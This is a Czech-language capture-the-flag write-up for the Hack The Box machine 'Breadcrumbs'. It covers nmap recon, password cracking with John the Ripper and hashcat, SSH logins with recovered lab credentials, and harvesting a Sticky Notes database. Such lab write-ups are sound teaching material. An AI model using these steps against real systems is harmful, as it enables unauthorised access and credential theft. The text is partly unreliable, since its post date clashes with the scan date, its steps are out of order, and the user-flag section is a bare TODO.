---
layout: post
author: Tomáš Matějíček
title: "Breadcrumbs"
date: 2020-11-12
tags: windows linux sql-injection smb ssh php
---
[Breadcrumbs](https://www.hackthebox.eu/home/machines/profile/316) je stroj z Hack The Box. Klíčová část útoku je webová enumerace a praktické zneužití nalezené slabiny.

### Vyhledání otevřených portů
Nejdřív mapuji služby, které jsou dostupné zvenku.
`ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP`
```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
[... výstup zkrácen ...]
|   date: 2021-03-23T20:35:20
|_  start_date: N/A

http://10.10.10.228/portal/php/
http://10.10.10.228/portal/php/admins.php
http://10.10.10.228/portal/php/users.php
http://10.10.10.228/portal/composer.json
http://10.10.10.228/portal/composer.lock
http://10.10.10.228/portal/vendor/composer/installed.json
http://10.10.10.228/portal/uploads/
```

### Lámání hesel nebo hashů
Pokud mám hash nebo šifrovaný soubor, slovníkový útok může odemknout další krok útoku.
`john	__CENSORED__`
```
emma	__CENSORED__
william	__CENSORED__
lucas	__CENSORED__
sirine	__CENSORED__
juliette	__CENSORED__
support	__CENSORED__
```

### Lámání hesel nebo hashů (2)
Pokud mám hash nebo šifrovaný soubor, slovníkový útok může odemknout další krok útoku.
`hashcat -m100 -a 0 hashes /usr/share/wordlists/rockyou.txt`

### Přihlášení na cíl
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`ssh www-data@$IP`
```
PS C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData> cat .\juliette.json
{
        "pizza" : "margherita",
        "size" : "large",
        "drink" : "water",
        "card" : "VISA",
        "PIN" : "9890",
        "alternate" : {
                "username" : "juliette",
                "password" : "jUli901./())!",
        }
}
```

### Přihlášení na cíl (2)
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`ssh juliette@$IP`
```
gc C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite* .
```

### Získání root flagu
Tímto potvrzuji úplné ovládnutí stroje.
`more root.txt`
```
__CENSORED__
```

### Získání user flagu
`TODO`
